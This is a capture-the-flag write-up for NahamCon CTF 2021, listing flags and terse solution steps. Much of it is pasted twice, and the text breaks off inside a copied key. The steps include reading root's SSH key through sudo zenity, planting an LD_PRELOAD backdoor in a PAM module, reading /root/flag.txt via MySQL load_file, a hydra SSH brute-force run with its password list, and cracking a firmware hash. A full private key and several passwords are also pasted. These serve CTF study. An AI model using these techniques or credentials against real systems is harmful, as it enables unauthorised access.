# Naham CTF 2021 Writeup

[Constellations Company Website](https://constellations.page/)

WHERE DO WE USE THIS FLAG? flag{e483bffafbb0db5eabc121846b455bc7}

## Table of Contents

- [Naham CTF 2021](#naham-ctf-2021-1)
  - [Table of Contents](#table-of-contents-1)
  - [Read the rules](#read-the-rules-1)
  - [Mission](#mission-1)
  - [Bionic](#bionic-1)
  - [Feedback Flag](#feedback-flag-1)
  - [Abyss](#abyss-1)
  - [esab64](#esab64-1)
  - [INE (Starter Pass)](#ine-starter-pass-1)
  - [Prison Break](#prison-break-1)
  - [Buzz](#buzz-1)
  - [Shoelaces](#shoelaces-1)
  - [Pollex](#pollex-1)
  - [Chicken Wings](#chicken-wings-1)
  - [Eight Circle](#eight-circle-1)
  - [Zenith](#zenith-1)
  - [$Echo](#echo-1)
  - [Google Play](#google-play-1)
  - [Car Keys](#car-keys-1)
  - [Veebee](#veebee-1)
  - [Mission - Employees](#mission---employees-1)
    - [Leo Rison - Development - Path1](#leo-rison---development---path1-1)
      - [Stage 1](#stage-1-1)
      - [Stage 2](#stage-2-1)
    - [Hercules Scoxland - Sales - Path2](#hercules-scoxland---sales---path2-1)
      - [Stage2](#stage2-1)
  - [Read the Docs](#read-the-docs-1)
  - [Andra](#andra)
  - [Homeward Bound](#homeward-bound)
  - [Ret2Basic](#ret2basic)
    - [Orion Morra - Support - Path3](#orion-morra---support---path3)
      - [PoC Stage 3 Path 3](#poc-stage-3-path-3)
      - [Attack Stage 3 Path 3](#attack-stage-3-path-3)
      - [firmware.tar.gz Stage 4 Path 3](#firmwaretargz-stage-4-path-3)
    - [Gus Rodry - Accounting - Path4](#gus-rodry---accounting---path4)
      - [Foothold](#foothold)
      - [Path to root flag?](#path-to-root-flag)
    - [Lyra Patte - Marketing - Path5](#lyra-patte---marketing---path5)
      - [Also found user list and passwords](#also-found-user-list-and-passwords)
      - [Crack login for pavo](#crack-login-for-pavo)
      - [login and get ~/flag.txt](#login-and-get-flagtxt)
      - [PHP LFI and FTP Log Poisoning](#php-lfi-and-ftp-log-poisoning)
  - [Andra](#andra-1)
  - [Homeward Bound](#homeward-bound-1)
  - [Ret2Basic](#ret2basic-1)
    - [Orion Morra - Support - Path3](#orion-morra---support---path3-1)
      - [PoC Stage 3 Path 3](#poc-stage-3-path-3-1)
      - [Attack Stage 3 Path 3](#attack-stage-3-path-3-1)
      - [firmware.tar.gz Stage 4 Path 3](#firmwaretargz-stage-4-path-3-1)
    - [Gus Rodry - Accounting - Path4](#gus-rodry---accounting---path4-1)
      - [Foothold](#foothold-1)
      - [Path to root flag?](#path-to-root-flag-1)
    - [Lyra Patte - Marketing - Path5](#lyra-patte---marketing---path5-1)
      - [Also found user list and passwords](#also-found-user-list-and-passwords-1)
      - [Crack login for pavo](#crack-login-for-pavo-1)
      - [login and get ~/flag.txt](#login-and-get-flagtxt-1)
      - [PHP LFI and FTP Log Poisoning](#php-lfi-and-ftp-log-poisoning-1)

## Read the rules

`flag{90bc54705794a62015369fd8e86e557b}`

## Mission

`mission`: `flag{48e117a1464c3202714dc9a350533a59}`

## Bionic

`bionic` in `/robots.txt`
`flag`: `flag{33b5240485dda77430d3de22996297a1}`

## Feedback Flag

`flag{we_hope_you_enjoyed_the_game}`

## Abyss

`flag{db758a0cc25523993416c305ef15f9ad}`

## esab64

`python -c 'print("mxWYntnZiVjMxEjY0kDOhZWZ4cjYxIGZwQmY2ATMxEzNlFjNl13X"[::-])' | base64 -d`
`python -c 'print("_}e61e711106bd0db1b78efa894b1125bf{galf"[::-1])'`
`flag{fb5211b498afe87b1bd0db601117e16e}`

## INE (Starter Pass)

`echo ZmxhZ3syOWZhMzA1YWFmNWUwMWU5ZWRjZjAxNDJlNGRkY2RiOX0= | base64 -d`
`flag{29fa305aaf5e01e9edcf0142e4ddcdb9}`

## Prison Break

`flag{1345fd3cb55434ba17d9b64ca350ec78}`

## Buzz

`mv buzz buzz.gz; gunzip buzz; cat buzz`
`flag{b3a33db7ba04c4c9052ea06d9ff17869}`

## Shoelaces

Flag was a string in the image.
`flag{137288e960a3ae9b148e8a7db16a69b0}`

## Pollex

binwalk the file and extract: `binwalk --dd='.*' pollex -e`
`flag{65c34a1ec121a286600ddd48fe36bc00}`

## Chicken Wings

`WingDing` font: `♐●♋♑❀♏📁🖮🖲📂♍♏⌛🖰♐🖮📂🖰📂🖰🖰♍📁🗏🖮🖰♌📂♍📁♋🗏♌♎♍🖲♏❝`
`flag{e0791ce68f718188c0378b1c0a3bdc9e}`

## Eight Circle

`Malbolge ... eighth circle of hell in Dante's Inferno`
Malbolge is a programmiug language, run it [here](http://www.malbolge.doleczek.pl/):
`flag{bf201f669b8c4adf8b91f09165ec8c5c}`

## Zenith

`zenity` has sudo privileges
Log in with X11 forwarding: `ssh -Y -p 31900 user@challenge.nahamcon.com`
show roots SSH key: `sudo /usr/bin/zenity --text-info --filename=/root/.ssh/id_rsa`
copied and logged in as root: `ssh -p 31900 -i root.priv root@challenge.nahamcon.com`
I knew `get_flag` existing from using the file browser but now that we're root it doesn't really matter.
`chmod +x get_flag; ./get_flag`

## $Echo

bash redirection for the flag: `<../flag.txt`
`flag{1beadaf44586ea4aba2ea9a00c5b6d91}`

## Google Play

Text was hidden in the PDF
`flag{a0a6cb3b4bc98bf2a34b7aed76aebf53}`

## Car Keys

got `foak{6f980c0101c8aa361977cac06508a3de}` from [here](https://www.dcode.fr/keyboard-change-cipher) changed `foak` to `flag`

## Veebee

`flag{f805593d933f5433f2a04f082f400d8c}`

## Mission - Employees

### Leo Rison - Development - Path1

#### Stage 1

`Instagram:` [Instgram](https://www.instagram.com/_leorison/)
`QR code`: [QR Code](https://www.instagram.com/p/CLzwjwxACXm)
`QR contains`:

```text
flag{636db5f4f0e36908a4f1a4edc5b0676e}
A password for Leo is `constelleorising`
```

A password for Leo is `constelleorising`

#### Stage 2

Sensible - ansible challenge
leo@sensible-59fae2229330a513-8fbc4fbdd-5spz4:~$ cat vault.yaml | ansible-vault decrypt
Vault password:
Decryption successful
il0vec0nst311at10ns

`flag{b1c6f8cf48deda9fd60ff0255e3de698}`

### Hercules Scoxland - Sales - Path2

`Herculues is Following Gus' GitHub`: `https://github.com/HerculesScox`
`Flag in`: `https://github.com/HerculesScox/maintenance/blob/main/connect.sh`
`flag{5bf9da15002d7ea53cb487f31781ce47}`

#### Stage2

`Hercules pass in connect.sh`: `starstruckherc`

`pamela` user: `pamela:x:1001:1001::/home/pamela:/bin/bash`

```shell
/home/pamela$ cat reminder.txt
Management said I created a gaping security hole in this workstation and I need to fix it... golly I wish they would call me by nickname...
```

We can see a pam module that has a different timestamp than the rest:

```shell
hercules@degrade-c9600342d92b4223-56fbdb7bd4-4qpp8:/usr/lib/x86_64-linux-gnu/security$ ls -lah
[...snip...]
-rw-r--r-- 1 root     root     461K Jan  6 20:47 pam_systemd.so
```

We have write access to /usr/lib/x86_64-linux-gnu/security
[LD_PRELOAD example code](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

compiled a backdoor and dropped into `/usr/lib/x86_64-linux-gnu/security/pam_env.so`

```shell
sudo -l
# whoami
root
```

`flag{2d39ef6b9bc80c74405c443fc83c5772}`

## Read the Docs
# Naham CTF 2021

[Constellations Company Website](https://constellations.page/)

WHERE DO WE USE THIS FLAG? flag{e483bffafbb0db5eabc121846b455bc7}

## Table of Contents

- [Naham CTF 2021](#naham-ctf-2021)
  - [Table of Contents](#table-of-contents)
  - [Read the rules](#read-the-rules)
  - [Mission](#mission)
  - [Bionic](#bionic)
  - [Feedback Flag](#feedback-flag)
  - [Abyss](#abyss)
  - [esab64](#esab64)
  - [INE (Starter Pass)](#ine-starter-pass)
  - [Prison Break](#prison-break)
  - [Buzz](#buzz)
  - [Shoelaces](#shoelaces)
  - [Pollex](#pollex)
  - [Chicken Wings](#chicken-wings)
  - [Eight Circle](#eight-circle)
  - [Zenith](#zenith)
  - [$Echo](#echo)
  - [Google Play](#google-play)
  - [Car Keys](#car-keys)
  - [Veebee](#veebee)
  - [Mission - Employees](#mission---employees)
    - [Leo Rison - Development - Path1](#leo-rison---development---path1)
      - [Stage 1](#stage-1)
      - [Stage 2](#stage-2)
    - [Hercules Scoxland - Sales - Path2](#hercules-scoxland---sales---path2)
      - [Stage2](#stage2)
  - [Read the Docs](#read-the-docs)
- [Naham CTF 2021](#naham-ctf-2021-1)
  - [Table of Contents](#table-of-contents-1)
  - [Read the rules](#read-the-rules-1)
  - [Mission](#mission-1)
  - [Bionic](#bionic-1)
  - [Feedback Flag](#feedback-flag-1)
  - [Abyss](#abyss-1)
  - [esab64](#esab64-1)
  - [INE (Starter Pass)](#ine-starter-pass-1)
  - [Prison Break](#prison-break-1)
  - [Buzz](#buzz-1)
  - [Shoelaces](#shoelaces-1)
  - [Pollex](#pollex-1)
  - [Chicken Wings](#chicken-wings-1)
  - [Eight Circle](#eight-circle-1)
  - [Zenith](#zenith-1)
  - [$Echo](#echo-1)
  - [Google Play](#google-play-1)
  - [Car Keys](#car-keys-1)
  - [Veebee](#veebee-1)
  - [Mission - Employees](#mission---employees-1)
    - [Leo Rison - Development - Path1](#leo-rison---development---path1-1)
      - [Stage 1](#stage-1-1)
      - [Stage 2](#stage-2-1)
    - [Hercules Scoxland - Sales - Path2](#hercules-scoxland---sales---path2-1)
      - [Stage2](#stage2-1)
  - [Read the Docs](#read-the-docs-1)
  - [Andra](#andra)
  - [Homeward Bound](#homeward-bound)
  - [Ret2Basic](#ret2basic)
    - [Orion Morra - Support - Path3](#orion-morra---support---path3)
      - [PoC Stage 3 Path 3](#poc-stage-3-path-3)
      - [Attack Stage 3 Path 3](#attack-stage-3-path-3)
      - [firmware.tar.gz Stage 4 Path 3](#firmwaretargz-stage-4-path-3)
    - [Gus Rodry - Accounting - Path4](#gus-rodry---accounting---path4)
      - [Foothold](#foothold)
      - [Path to root flag?](#path-to-root-flag)
    - [Lyra Patte - Marketing - Path5](#lyra-patte---marketing---path5)
      - [Also found user list and passwords](#also-found-user-list-and-passwords)
      - [Crack login for pavo](#crack-login-for-pavo)
      - [login and get ~/flag.txt](#login-and-get-flagtxt)
      - [PHP LFI and FTP Log Poisoning](#php-lfi-and-ftp-log-poisoning)
  - [Andra](#andra-1)
  - [Homeward Bound](#homeward-bound-1)
  - [Ret2Basic](#ret2basic-1)
    - [Orion Morra - Support - Path3](#orion-morra---support---path3-1)
      - [PoC Stage 3 Path 3](#poc-stage-3-path-3-1)
      - [Attack Stage 3 Path 3](#attack-stage-3-path-3-1)
      - [firmware.tar.gz Stage 4 Path 3](#firmwaretargz-stage-4-path-3-1)
    - [Gus Rodry - Accounting - Path4](#gus-rodry---accounting---path4-1)
      - [Foothold](#foothold-1)
      - [Path to root flag?](#path-to-root-flag-1)
    - [Lyra Patte - Marketing - Path5](#lyra-patte---marketing---path5-1)
      - [Also found user list and passwords](#also-found-user-list-and-passwords-1)
      - [Crack login for pavo](#crack-login-for-pavo-1)
      - [login and get ~/flag.txt](#login-and-get-flagtxt-1)
      - [PHP LFI and FTP Log Poisoning](#php-lfi-and-ftp-log-poisoning-1)

## Read the rules

`flag{90bc54705794a62015369fd8e86e557b}`

## Mission

`mission`: `flag{48e117a1464c3202714dc9a350533a59}`

## Bionic

`bionic` in `/robots.txt`
`flag`: `flag{33b5240485dda77430d3de22996297a1}`

## Feedback Flag

`flag{we_hope_you_enjoyed_the_game}`

## Abyss

`flag{db758a0cc25523993416c305ef15f9ad}`

## esab64

`python -c 'print("mxWYntnZiVjMxEjY0kDOhZWZ4cjYxIGZwQmY2ATMxEzNlFjNl13X"[::-])' | base64 -d`
`python -c 'print("_}e61e711106bd0db1b78efa894b1125bf{galf"[::-1])'`
`flag{fb5211b498afe87b1bd0db601117e16e}`

## INE (Starter Pass)

`echo ZmxhZ3syOWZhMzA1YWFmNWUwMWU5ZWRjZjAxNDJlNGRkY2RiOX0= | base64 -d`
`flag{29fa305aaf5e01e9edcf0142e4ddcdb9}`

## Prison Break

`flag{1345fd3cb55434ba17d9b64ca350ec78}`

## Buzz

`mv buzz buzz.gz; gunzip buzz; cat buzz`
`flag{b3a33db7ba04c4c9052ea06d9ff17869}`

## Shoelaces

Flag was a string in the image.
`flag{137288e960a3ae9b148e8a7db16a69b0}`

## Pollex

binwalk the file and extract: `binwalk --dd='.*' pollex -e`
`flag{65c34a1ec121a286600ddd48fe36bc00}`

## Chicken Wings

`WingDing` font: `♐●♋♑❀♏📁🖮🖲📂♍♏⌛🖰♐🖮📂🖰📂🖰🖰♍📁🗏🖮🖰♌📂♍📁♋🗏♌♎♍🖲♏❝`
`flag{e0791ce68f718188c0378b1c0a3bdc9e}`

## Eight Circle

`Malbolge ... eighth circle of hell in Dante's Inferno`
Malbolge is a programmiug language, run it [here](http://www.malbolge.doleczek.pl/):
`flag{bf201f669b8c4adf8b91f09165ec8c5c}`

## Zenith

`zenity` has sudo privileges
Log in with X11 forwarding: `ssh -Y -p 31900 user@challenge.nahamcon.com`
show roots SSH key: `sudo /usr/bin/zenity --text-info --filename=/root/.ssh/id_rsa`
copied and logged in as root: `ssh -p 31900 -i root.priv root@challenge.nahamcon.com`
I knew `get_flag` existing from using the file browser but now that we're root it doesn't really matter.
`chmod +x get_flag; ./get_flag`

## $Echo

bash redirection for the flag: `<../flag.txt`
`flag{1beadaf44586ea4aba2ea9a00c5b6d91}`

## Google Play

Text was hidden in the PDF
`flag{a0a6cb3b4bc98bf2a34b7aed76aebf53}`

## Car Keys

got `foak{6f980c0101c8aa361977cac06508a3de}` from [here](https://www.dcode.fr/keyboard-change-cipher) changed `foak` to `flag`

## Veebee

`flag{f805593d933f5433f2a04f082f400d8c}`

## Mission - Employees

### Leo Rison - Development - Path1

#### Stage 1

`Instagram:` [Instgram](https://www.instagram.com/_leorison/)
`QR code`: [QR Code](https://www.instagram.com/p/CLzwjwxACXm)
`QR contains`:

```text
flag{636db5f4f0e36908a4f1a4edc5b0676e}
A password for Leo is `constelleorising`
```

A password for Leo is `constelleorising`

#### Stage 2

Sensible - ansible challenge
leo@sensible-59fae2229330a513-8fbc4fbdd-5spz4:~$ cat vault.yaml | ansible-vault decrypt
Vault password:
Decryption successful
il0vec0nst311at10ns

`flag{b1c6f8cf48deda9fd60ff0255e3de698}`

### Hercules Scoxland - Sales - Path2

`Herculues is Following Gus' GitHub`: `https://github.com/HerculesScox`
`Flag in`: `https://github.com/HerculesScox/maintenance/blob/main/connect.sh`
`flag{5bf9da15002d7ea53cb487f31781ce47}`

#### Stage2

`Hercules pass in connect.sh`: `starstruckherc`

`pamela` user: `pamela:x:1001:1001::/home/pamela:/bin/bash`

```shell
/home/pamela$ cat reminder.txt
Management said I created a gaping security hole in this workstation and I need to fix it... golly I wish they would call me by nickname...
```

We can see a pam module that has a different timestamp than the rest:

```shell
hercules@degrade-c9600342d92b4223-56fbdb7bd4-4qpp8:/usr/lib/x86_64-linux-gnu/security$ ls -lah
[...snip...]
-rw-r--r-- 1 root     root     461K Jan  6 20:47 pam_systemd.so
```

We have write access to /usr/lib/x86_64-linux-gnu/security
[LD_PRELOAD example code](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

compiled a backdoor and dropped into `/usr/lib/x86_64-linux-gnu/security/pam_env.so`

```shell
sudo -l
# whoami
root
```

`flag{2d39ef6b9bc80c74405c443fc83c5772}`

## Read the Docs

Have not solved yet.

## Andra

unzipped the apk and grepped for `flag{`
`flag{d9f72316dbe7ceab0db10bed1a738482}`

## Homeward Bound

Used burpsuite to forge `X-Forwared-For: 127.0.0.1` headers
`flag{26080a2216e95746ec3e932002b9baa4}`

## Ret2Basic

buffer overflow 120 characters + address of `win` function == flag!
`flag{d07f3219a8715e9339f31cfbe09d6502}`

----

### Orion Morra - Support - Path3

`Twitter`: `https://twitter.com/OrionMorra`
`Flag in picture`: `flag{0bcffb17cbcbf4359a42ec45d0ccaf2}`
`password on sticky note`: `stars4love4life`

#### PoC Stage 3 Path 3

`Used`: `https://recipeforroot.com/mysql-to-system-root/`

```sql
USE mysql;
CREATE TABLE potato(line blob);
INSERT INTO potato values(load_file('C://Users//Bob//Desktop//lib_mysqludf_sys.dll'));
SELECT * from potato;
```

#### Attack Stage 3 Path 3

```sql
USE mysql;
CREATE TABLE potato(line blob);
INSERT INTO potato values(load_file('/root/flag.txt'));
```

`root flag`: `flag{183bdf6f145a1c97f0b4f520355e8ed5}`

#### firmware.tar.gz Stage 4 Path 3

`"backdoor"` in `firmware.tar.gz`

Used `binwalk` to find and extract `squashfs`.

`Backoor in`: `/etc/config/rpcd`

```config login
        option username 'admin'
        option password '$1$qAwSeDrF$tg905TwqmYu022yeBN/F61'
```

`Crack with hashcat`:

```shell
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1212312121       (?)
```

```shell
$ echo 1212312121 | md5sum
5e0f2efaea11abd669977ad332b1871f
```

### Gus Rodry - Accounting - Path4

[GitHub org](https://github.com/constellations-git)
[Gus' GitHub](https://github.com/gusrodry)
[Gus' Dev Repo](https://github.com/gusrodry/development.git)

#### Foothold

`Gus' SSH key`:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
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
yijZOk41Lh95EAAAAKam9obkB4cHMxNQE=
-----END OPENSSH PRIVATE KEY-----
```

#### Path to root flag?

`bank.c`: `https://github.com/gusrodry/development/blob/1257ad8850038d4f11acf807ac57d36b639a013a/bank.c`

### Lyra Patte - Marketing - Path5

`Twitter`: `https://twitter.com/LyraPatte`
`Twitter post with data leak`: `https://twitter.com/LyraPatte/status/1369086826263240704`
`Users/Passwords`: `https://constellations.page/constellations-documents/5/`
flag: `flag{bd869e6193c27308d2fd3ad4b427e8c3}`

#### Also found user list and passwords

```text
orion
pavo
gus
vela
hercules
leo
lyra
gemini
```

```text
flag{bd869e6193c27308d2fd3ad4b427e8c3}
starstar
allstars
starstruck
starshine
starsky
popstars
starship
bluestars
pinkstars
superstars
ilovestars
rockstars
thestars
starscream
gostars
shootingstars
northstars
alpinestars
starsign
moonandstars
starsrock
luckystars
iluvstars
fivestars
redstars
mystars
lovestars
dallasstars
moonstars
sunmoonstars
starsailor
silverstars
sevenstars
lilstars
dotaallstars
sunstars
starsun
starsstars
starsareblind
pokerstars
magicstars
divastars
blackstars
starstarstar
starsearch
luvstars
greenstars
deathstars
brightstars
twinstars
starsinthesky
starshooter
starsha
threestars
summerstars
starspirit
starshollow
starsandstripes
starsandmoons
nightstars
metrostars
icstars
hoodstars
deadstars
citystars
```

#### Crack login for pavo

```text
hydra -L users -P pass -s 31663 challenge.nahamcon.com -t 5 ssh
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-12 21:48:53
[DATA] max 10 tasks per 1 server, overall 10 tasks, 528 login tries (l:8/p:66), ~53 tries per task
[DATA] attacking ssh://challenge.nahamcon.com:31663/
[STATUS] 66.00 tries/min, 66 tries in 00:01h, 462 to do in 00:07h, 10 active
[31663][ssh] host: challenge.nahamcon.com   login: pavo   password: starsinthesky
```

#### login and get ~/flag.txt

`flag{cadbbfd75d2547700221f8c2588e026e}`

#### PHP LFI and FTP Log Poisoning

`PoC`: [RCE via LFI Log Poisoning - The Death Potion](https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d)
![log poisoning](https://imgur.com/a/gcXMev7)
`flag`: `flag{892427c840bdb0f4cf16af94b7312804}`

Have not solved yet.

## Andra

unzipped the apk and grepped for `flag{`
`flag{d9f72316dbe7ceab0db10bed1a738482}`

## Homeward Bound

Used burpsuite to forge `X-Forwared-For: 127.0.0.1` headers
`flag{26080a2216e95746ec3e932002b9baa4}`

## Ret2Basic

buffer overflow 120 characters + address of `win` function == flag!
`flag{d07f3219a8715e9339f31cfbe09d6502}`

----

### Orion Morra - Support - Path3

`Twitter`: `https://twitter.com/OrionMorra`
`Flag in picture`: `flag{0bcffb17cbcbf4359a42ec45d0ccaf2}`
`password on sticky note`: `stars4love4life`

#### PoC Stage 3 Path 3

`Used`: `https://recipeforroot.com/mysql-to-system-root/`

```sql
USE mysql;
CREATE TABLE potato(line blob);
INSERT INTO potato values(load_file('C://Users//Bob//Desktop//lib_mysqludf_sys.dll'));
SELECT * from potato;
```

#### Attack Stage 3 Path 3

```sql
USE mysql;
CREATE TABLE potato(line blob);
INSERT INTO potato values(load_file('/root/flag.txt'));
```

`root flag`: `flag{183bdf6f145a1c97f0b4f520355e8ed5}`

#### firmware.tar.gz Stage 4 Path 3

`"backdoor"` in `firmware.tar.gz`

Used `binwalk` to find and extract `squashfs`.

`Backoor in`: `/etc/config/rpcd`

```config login
        option username 'admin'
        option password '$1$qAwSeDrF$tg905TwqmYu022yeBN/F61'
```

`Crack with hashcat`:

```shell
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1212312121       (?)
```

```shell
$ echo 1212312121 | md5sum
5e0f2efaea11abd669977ad332b1871f
```

### Gus Rodry - Accounting - Path4

[GitHub org](https://github.com/constellations-git)
[Gus' GitHub](https://github.com/gusrodry)
[Gus' Dev Repo](https://github.com/gusrodry/development.git)

#### Foothold

`Gus' SSH key`:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvbURXtxR2YlIMZfdUqfsRzcNS/O9IVAX3LhfVPAhMeLrjwsYiuHX
q8L9M//rN9VJWNHWQQziVRJvjK24doto/XVf05c0o7+gnXTC/sZkWlHAImImskLQHdCKyC
DeDJZr50DpfOdRtSfYznZdbn9CODvvPlyoqnoKoxhc+1YzlTC2HeszA3kjr0Vskg8gYMBh
KJ9mKu3oDTkME8Ekt5/uu/JKIFqejyrlNb0gsV4ilhECZZg5JLvR/sIbFhdEAT6yeRmywh
bx7QFPc4bhXNBrsg4ZLYBBb0Un/hjc7qP2c4TcmdrkvWClvlwXN8jqIkxMuEki7t6OUrIu
rFX3CqxsToUDZ20V6lhiGqn+McRNYVtJ/QWi9BKGMFkOcqVfzw15R6k736UNCzFTmYWkLN
qy41HtNbR6fmrz3qMbmiF3rCyrEEkwBXRfSIK+vRzUBoaBsX1PDmVQm1/ioyFCSvTqDn2e
aYZ9/YqNgc85eZ8cGIO+3MRPP7itkhcMGGawciNhAAAFgIY5cViGOXFYAAAAB3NzaC1yc2
EAAAGBAL21EV7cUdmJSDGX3VKn7Ec3DUvzvSFQF9y4X1TwITHi648LGIrh16vC/TP/6zfV
SVjR1kEM4lUSb4ytuHaLaP11X9OXNKO/oJ10wv7GZFpRwCJiJrJC0B3Qisgg3gyWa+dA6X
znUbUn2M52XW5/Qjg77z5cqKp6CqMYXPtWM5Uwth3rMwN5I69FbJIPIGDAYSifZirt6A05
DBPBJLef7rvySiBano8q5TW9ILFeIpYRAmWYOSS70f7CGxYXRAE+snkZssIW8e0BT3OG4V
zQa7IOGS2AQW9FJ/4Y3O6j9nOE3Jna5L1gpb5cFzfI6iJMTLhJIu7ejlKyLqxV9wqsbE6F
A2dtFepYYhqp/jHETWFbSf0FovQShjBZDnKlX88NeUepO9+lDQsxU5mFpCzasuNR7TW0en
5q896jG5ohd6wsqxBJMAV0X0iCvr0c1AaGgbF9Tw5lUJtf4qMhQkr06g59nmmGff2KjYHP
OXmfHBiDvtzETz+4rZIXDBhmsHIjYQAAAAMBAAEAAAGADhRiNagkawDFWujqhDfyUVbEpd
5xKwfGvZrxeFxaGlm9IeCw8Z3RY+4U3MchrgMmbnEkda9/HNFBdi9ugV3XbPhJJGsUfRK7
2PPRhRc0W3+1wteGB7TtvUi9BB1sXYLMf11R9vM0HT3X2XrvdEP9pi7MktRNsFlecLxeKk
k7itcSrSXHo3paK6f7Ztu4i3W7wEgUTRtbHaAeRVkQYJB+J3TUC5KuMfH9EP/4bTGPX5Pj
maaylwdZjo7Zc8pGQdFlTJzHul4e5TinN/gMo5G8dPW337ArtHcaRD5Y0sMtsxgeWdSykB
3aMSpp8K0t/ER0IILu+HyhvfplPsTMb5niRPPXznPlvI7gQDelKJqYnA5OHAFNEqmT5U7x
jbNX4cByYM4MBT6uluafEMcuuRVeifm2kOuSvTU1fy4lcf6VI9Nz0v4IltHbHyFXiQ9NDe
bPF2qnnuXM5nicUIrlKW17vFpBCi4+GudMZoz1XLUCZOEad2KduANsw7OWig653gABAAAA
